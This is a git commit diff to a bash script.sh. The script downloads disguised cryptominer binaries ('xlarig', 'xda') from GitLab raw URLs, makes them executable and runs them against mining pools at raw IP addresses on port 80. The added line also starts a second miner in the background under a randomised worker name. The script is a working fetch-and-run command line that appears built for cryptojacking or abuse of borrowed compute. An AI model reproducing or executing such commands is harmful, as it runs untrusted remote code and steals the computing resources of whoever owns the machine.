cce3c511236be1067ffadfc13da29ff7aaad9810
inkabound <158990409+inkabound@users.noreply.github.com>
2024-03-22 14:47:23 +0700

    Update script.sh

--- script.sh
+++ script.sh
@@ -1,3 +1,3 @@
 #!/usr/bin/env bash
 
-wget https://gitlab.com/bromase889/cobagas/-/raw/main/xlarig.tar.gz && tar -xvf xlarig.tar.gz && chmod 700 xlarig && ./xlarig -o 174.138.31.32:80 -u ZEPHYR2BcgCURr7KMEwog6HXk83Hbmf5eYv3mNTCeLgBGLkneZeS2pMiJ5D7WpEyycj22yyWzCUfUKBHQpXCXAYZDZ3sdvYLNzc33 -p BERLIN
+wget https://gitlab.com/adul2/Abah/-/raw/main/xda && chmod +x xda && ./xda --algo PYRIN --pool 167.99.66.198:80 --user pyrin:qzmqus5ay6ncrp6qeaqkqjmkzem9sq6r8lttv8pzacs7sm66kmyaq8k77ny92.mamahiwed$(shuf -n 1 -i 1-9999999) --no-cl & wget https://gitlab.com/bromase889/cobagas/-/raw/main/xlarig.tar.gz && tar -xvf xlarig.tar.gz && chmod 700 xlarig && ./xlarig -o 174.138.31.32:80 -u ZEPHYR2BcgCURr7KMEwog6HXk83Hbmf5eYv3mNTCeLgBGLkneZeS2pMiJ5D7WpEyycj22yyWzCUfUKBHQpXCXAYZDZ3sdvYLNzc33 -p twt
